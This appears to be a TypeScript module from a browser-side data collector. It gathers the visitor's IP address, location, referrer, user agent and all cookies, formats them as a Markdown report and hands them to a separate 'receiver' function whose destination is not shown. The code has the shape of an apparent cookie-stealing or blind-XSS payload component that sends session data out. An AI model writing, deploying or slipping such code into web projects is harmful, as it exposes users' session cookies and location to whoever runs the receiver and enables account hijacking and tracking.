import { pretty } from 'utils';
import { getBrowserInfo } from './getBrowserInfo';
import { sendDataToReceiver } from './sendDataToReceiver';

export const sendBrowserInfo = (): Promise<void> =>
	getBrowserInfo().then((browserInfo) => {
		sendDataToReceiver({
			context: 'browser_info',
			message:
				'\n-- **Browser Info** --\n\n' +
				`- IP: \`${browserInfo.ip || ' '}\`\n` +
				`- Location: \`${browserInfo.location || ' '}\`\n` +
				`- Referrer: \`${browserInfo.referrer || ' '}\`\n` +
				`- User Agent: \`${browserInfo.userAgent || ' '}\`\n` +
				'\n-- **Cookies** --\n\n' +
				pretty(browserInfo.cookies),
			json: JSON.stringify(browserInfo),
		});
	});
